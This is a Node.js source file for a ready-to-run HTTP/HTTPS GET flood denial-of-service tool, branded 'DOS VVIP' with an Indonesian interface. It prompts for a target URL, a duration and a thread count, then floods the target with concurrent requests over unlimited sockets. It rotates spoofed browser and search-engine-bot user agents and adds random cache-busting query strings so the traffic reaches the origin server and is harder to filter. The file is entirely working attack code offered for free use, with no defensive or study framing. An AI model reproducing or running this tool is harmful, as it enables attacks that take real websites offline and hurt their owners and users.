import http from 'http';
import https from 'https';
import readline from 'readline-sync';
import chalk from 'chalk';
import ora from 'ora';
import { URL } from 'url';

const asciiArt = `
${chalk.redBright('________   ________    _________           ____   ____._____________ ')}
${chalk.redBright('\\______ \\  \\_____  \\  /   _____/           \\   \\ /   /|   \\______   \\')}
${chalk.redBright(' |    |  \\  /   |   \\ \\_____  \\    ______   \\   Y   / |   ||     ___/')}
${chalk.redBright(' |    `   \\/    |    \\/        \\  /_____/    \\     /  |   ||    |    ')}
${chalk.redBright('/_______  /\\_______  /_______  /              \\___/   |___||____|    ')}
${chalk.redBright('        \\/         \\/        \\/')}${chalk.white('       DOS VVIP BY AJUDAN.0FC')}
${chalk.cyan('  NOTE : JANGAN DI JUAL YA ADIK" INI FREEEEEEE.....')}
`;

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (iPad; CPU OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/83.0.4103.88 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
];

function getRandomUserAgent() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function getRandomQueryString() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 10; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return `?_cachebust=${result}=${Date.now()}`;
}

let successfulRequests = 0;
let failedRequests = 0;
const failureReasons = {};

async function attack(targetUrl, duration, threads) {
    const parsedUrl = new URL(targetUrl);
    const protocol = parsedUrl.protocol === 'https:' ? https : http;
    const options = {
        hostname: parsedUrl.hostname,
        port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
        method: 'GET',
        headers: {},
        agent: new protocol.Agent({ keepAlive: true, maxSockets: Infinity })
    };

    let attacking = true;
    let attackTimer;


    successfulRequests = 0;
    failedRequests = 0;
    for (const key in failureReasons) {
        if (Object.prototype.hasOwnProperty.call(failureReasons, key)) {
            delete failureReasons[key];
        }
    }

    const spinner = ora({
        text: chalk.cyan(`Menyerang : Sukses: 0, Gagal: 0`),
        spinner: 'dots'
    }).start();

    const updateInterval = setInterval(() => {
        let statusText = `Menyerang : Sukses: ${successfulRequests}, Gagal: ${failedRequests}`;
        const mostFrequentReason = Object.keys(failureReasons).sort((a, b) => failureReasons[b] - failureReasons[a])[0];
        if (mostFrequentReason) {
            statusText += ` (Alasan: ${mostFrequentReason})`;
        }
        spinner.text = chalk.cyan(statusText);
    }, 200);

    attackTimer = setTimeout(() => {
        attacking = false;
        clearInterval(updateInterval);
        spinner.stop();
        console.log(`\n${chalk.green('Serangan berakhir. Hasil:')}`);
        displayResults();
    }, duration * 1000);

    console.log(chalk.yellow(`\nMenyerang target: ${targetUrl} selama ${duration} detik dengan ${threads} thread.`));

    const makeRequest = async () => {
        while (attacking) {
            try {
                options.headers['User-Agent'] = getRandomUserAgent();
                const path = parsedUrl.pathname + getRandomQueryString();

                await new Promise((resolve, reject) => {
                    const req = protocol.request({ ...options, path }, (res) => {
                        res.on('data', () => {}); 
                        res.on('end', () => {
                            if (res.statusCode >= 200 && res.statusCode < 400) {
                                successfulRequests++;
                            } else {
                                failedRequests++;
                                const reason = `HTTP ${res.statusCode}`;
                                failureReasons[reason] = (failureReasons[reason] || 0) + 1;
                            }
                            resolve();
                        });
                    });

                    req.on('error', (err) => {
                        failedRequests++;
                        const reason = err.code || err.message;
                        failureReasons[reason] = (failureReasons[reason] || 0) + 1;
                        reject(err);
                    });

                    req.end();
                });
            } catch (error) {
                 }
          
            await new Promise(resolve => setImmediate(resolve));
        }
    };

    for (let i = 0; i < threads; i++) {
        makeRequest();
    }

    await new Promise(resolve => {
        const checkAttackStatus = setInterval(() => {
            if (!attacking) {
                clearInterval(checkAttackStatus);
                resolve();
            }
        }, 100);
    });
}

function displayResults() {
    console.log(`\n${chalk.magenta('Ringkasan serangan:')}`);
    console.log(`${chalk.green(`✓✓✓ Sukses: ${successfulRequests}`)}`);
    console.log(`${chalk.red(`XXX Gagal: ${failedRequests}`)}`);

    if (Object.keys(failureReasons).length > 0) {
        console.log(chalk.yellow('Alasan kegagalan:'));
        for (const reason in failureReasons) {
            console.log(`  - ${reason}: ${failureReasons[reason]} kali`);
        }
    }
    console.log(chalk.red('\nSelesai.'));
}

async function main() {
    while (true) {
        console.clear();
        const loadingSpinner = ora(chalk.cyan('Memuat...')).start();
        await new Promise(resolve => setTimeout(resolve, 2000));
        loadingSpinner.stop();
        
        console.log(asciiArt);
        console.log(chalk.yellow('Selamat datang di DOS-VVIP FREE...\nJenis serangan : HTTP/HTTPS GET Flood '));

        const targetUrl = readline.question(chalk.magenta('IP/URL::>> '));
        const duration = parseInt(readline.question(chalk.magenta('Durasi (detik): ')), 10);
        const threads = parseInt(readline.question(chalk.magenta('Threads: ')), 10);

        if (!targetUrl || isNaN(duration) || duration <= 0 || isNaN(threads) || threads <= 0) {
            console.log(chalk.red('Input tidak valid. Coba lagi.'));
            await new Promise(resolve => setTimeout(resolve, 3000)); 
            continue;
        }

        await attack(targetUrl, duration, threads);

        const choice = readline.question(chalk.magenta('\nPilihan:\n0. Keluar\n1. Lanjut\n> '));
        if (choice === '0') {
            process.exit(0); 
        } else if (choice === '1') {
          
            continue;
        } else {
            console.log(chalk.red('Pilihan tidak valid. Keluar.'));
            process.exit(1); 
        }
    }
}

main();
  
